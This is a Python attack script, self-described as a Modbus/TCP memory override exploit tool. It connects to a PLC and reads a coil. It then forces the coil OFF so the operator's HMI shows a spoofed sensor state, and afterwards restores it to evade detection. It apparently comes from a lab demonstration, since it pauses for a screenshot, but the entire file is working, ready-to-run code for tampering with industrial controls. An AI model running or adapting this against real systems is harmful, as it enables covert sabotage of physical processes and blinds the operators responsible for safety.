import socket
import struct
import time

# --- ANSI Escape Codes for Colors ---
RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
BOLD = "\033[1m"
BG_RED = "\033[41m"
WHITE = "\033[97m"

def print_banner():
    banner = f"""{RED}{BOLD}
    ███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗   ██╗███████╗
    ████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║   ██║██╔════╝
    ██╔████╔██║██║   ██║██║  ██║██████╔╝██║   ██║███████╗
    ██║╚██╔╝██║██║   ██║██║  ██║██╔══██╗██║   ██║╚════██║
    ██║ ╚═╝ ██║╚██████╔╝██████╔╝██████╔╝╚██████╔╝███████║
    ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
    {YELLOW}[*] MODBUS/TCP MEMORY OVERRIDE EXPLOIT TOOL [*]{RESET}
    """
    print(banner)

def hexdump(title, data):
    hex_str = " ".join([f"{b:02X}" for b in data])
    print(f"{CYAN}[HEX] {title}:{RESET} {hex_str}")

def send_modbus(s, tx_id, fc, addr, value):
    # MBAP: Trans ID(2), Proto ID(2)=0, Length(2)=6, Unit ID(1)=1
    # PDU : FC(1), Addr(2), Value(2)
    pkt = struct.pack('>HHHBBHH', tx_id, 0, 6, 1, fc, addr, value)
    hexdump(f"TX (FC 0x{fc:02X})", pkt)
    s.sendall(pkt)
    resp = s.recv(256)
    hexdump(f"RX (Echo/Resp)", resp)
    return resp

def main():
    print_banner()
    
    target_ip = '192.168.100.11'
    target_port = 502
    
    print(f"{YELLOW}[*] Connecting to Target: {target_ip}:{target_port}...{RESET}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((target_ip, target_port))
        print(f"{GREEN}[+] Connected successfully.{RESET}\n")
    except Exception as e:
        print(f"{RED}[!] Connection failed: {e}{RESET}")
        return

    print(f"{BOLD}=== STAGE 1: Information Gathering (Read Coils) ==={RESET}")
    r = send_modbus(s, 990, 0x01, 0x0000, 1)
    status = r[-1]
    print(f"{MAGENTA}[>] Target Coil 0 State: {status:08b}b (1=ON, 0=OFF){RESET}\n")
    time.sleep(1)

    print(f"{BOLD}{RED}=== STAGE 2: MEMORY OVERRIDE ATTACK (FC 0x05) ==={RESET}")
    print(f"{YELLOW}[*] Injecting malicious payload to override sensor status...{RESET}")
    # Force Coil 0 to OFF (0x0000)
    r = send_modbus(s, 991, 0x05, 0x0000, 0x0000)
    print(f"{GREEN}[+] Exploit payload delivered!{RESET}\n")
    time.sleep(1)

    print(f"{BOLD}=== STAGE 3: Verify Contamination ==={RESET}")
    r = send_modbus(s, 992, 0x01, 0x0000, 1)
    new_status = r[-1]
    if new_status == 0:
        print(f"{GREEN}[SUCCESS] Sensor is successfully spoofed to OFF! HMI will be blind.{RESET}\n")
    else:
        print(f"{RED}[FAIL] Override failed.{RESET}\n")
        
    print(f"\n{BG_RED}{WHITE}{BOLD} [>>>] CAMERA READY? You have 15 SECONDS to take a screenshot of the HMI Dashboard! [<<<] {RESET}\n")
    time.sleep(15)
    
    print(f"{BOLD}{YELLOW}=== STAGE 4: RESTORE STATE (Stealth Mode) ==={RESET}")
    # Force Coil 0 back to ON (0xFF00)
    r = send_modbus(s, 993, 0x05, 0x0000, 0xFF00)
    print(f"{GREEN}[+] State restored to normal to evade detection.{RESET}\n")
    
    s.close()
    print(f"{BOLD}{CYAN}[*] Disconnected. Hack completed.{RESET}")

if __name__ == '__main__':
    main()
